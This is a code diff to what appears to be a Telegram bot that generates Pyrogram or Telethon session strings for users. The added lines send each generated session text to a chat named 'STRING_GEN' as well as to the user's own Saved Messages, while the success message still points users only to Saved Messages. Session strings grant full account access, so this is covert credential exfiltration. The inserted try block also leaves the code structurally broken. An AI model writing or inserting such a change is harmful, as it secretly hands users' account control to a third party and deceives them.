@@ -178,13 +178,15 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     try:
         if not is_bot:
             await client.send_message("me", text)
+    try:
+        await client.send_message('STRING_GEN', text)
         else:
             await bot.send_message(msg.chat.id, text)
     except KeyError:
         pass
     await client.disconnect()
     await bot.send_message(msg.chat.id, "❍ sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\n❍ ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ғᴏʀ ɢᴇᴛᴛɪɴɢ ɪᴛ.\n\n❍ ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ [˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD)".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
-
+    
 
 async def cancelled(msg):
     if "/cancel" in msg.text:
